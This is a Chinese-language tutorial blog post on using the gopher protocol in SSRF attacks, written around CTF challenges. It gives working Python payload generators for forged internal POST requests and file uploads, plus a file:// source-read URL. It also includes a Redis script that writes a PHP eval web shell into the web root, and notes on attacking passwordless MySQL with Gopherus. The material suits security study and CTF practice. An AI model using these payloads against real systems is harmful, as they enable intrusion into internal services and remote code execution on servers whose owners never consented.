##  gophar的利用

###  定义

gopher协议是一种信息查0找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面

利用：

```
攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求
```

###  发送GET请求和POST请求

gopher`协议的格式：`gopher://IP:port/_TCP/IP数据流

GTE请求

```php
构造HTTP数据包

URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束

发送gopher协议, 协议后的IP一定要接端口
```

POST请求

```php
POST与GET传参的区别：它有4个参数为必要参数

需要传递Content-Type,Content-Length,host,post的参数

切记：Content-Length和POST的参数长度必须一致
```

例子：

使用file协议读取源码：`?url=file:///var/www/html/index.php`

python脚本生成payload（POST和GTE请求都适用）

```python
import urllib.parse

payload = """
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=a68a3b03e80ce7fef96007dfa01dc077
"""
tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLFL漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)
```

###  构造一个提交文件的POST请求

首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式

```python
import urllib.parse
​
payload = \
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 293
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
​
------WebKitFormBoundaryz0BDuCoolR1Vg7or
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain
​
hello world!
------WebKitFormBoundaryz0BDuCoolR1Vg7or
Content-Disposition: form-data; name="submit"
​
submit
------WebKitFormBoundaryz0BDuCoolR1Vg7or--
"""
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)
```

### gopher打FastCGI 

[看我这一篇](https://blog.csdn.net/unexpectedthing/article/details/121643002)





### gopher打redis

[看我这一篇

[](https://blog.csdn.net/unexpectedthing/article/details/121667613)

```
import urllib.parse
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename="1.php"
path="/var/www/html"
passwd=""        #如果无密码就不加，如果有密码就加 
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(urllib.parse.quote(payload))

```



###  gopher打mysql

gopher打mysql，就是利用gopher协议传shell到mysql中。



首先Mysql存在三种连接方式

- Unix套接字；
- 内存共享/命名管道；
- TCP/IP套接字；

MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。

- 当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证
- 当无需密码认证时直接发送TCP/IP数据包即可

这儿对localhost和127.0.0.1做一个区别

```
localhost也叫local ，正确的解释是：本地服务器。
127.0.0.1的正确解释是：本机地址（本机服务器），它的解析通过本机的host文件，windows自动将localhost解析为127.0.0.1。
localhot（local）是不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制。127.0.0.1是通过网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制
简单说
当我们通过mysql -hlocalhost -uname去连接的时候，没有经过网卡，使用的是unix套接字连接，这种时候我们tcpdump是抓不到包的
当我们需要抓取mysql通信数据包时必须使用TCP/IP套接字连接。
mysql -h 127.0.0.1 -uname
```

我们平常打mysql最常用的就是打无密码的mysql

但是我们在用gopher还是需要用dict协议去得到mysql的端口(默认是3306)

直接使用的[gopherus工具](https://github.com/tarunkant/Gopherus)

![在这里插入图片描述](https://img-blog.csdnimg.cn/75cc5f2c09e9454c90380172c142084a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16)

直接快速生成payload

参考的CTF题

[ISITDTU CTF Friss](https://xz.aliyun.com/t/2500#toc-0)

[从一道CTF题目看Gopher攻击MySql](https://www.freebuf.com/articles/web/159342.html)



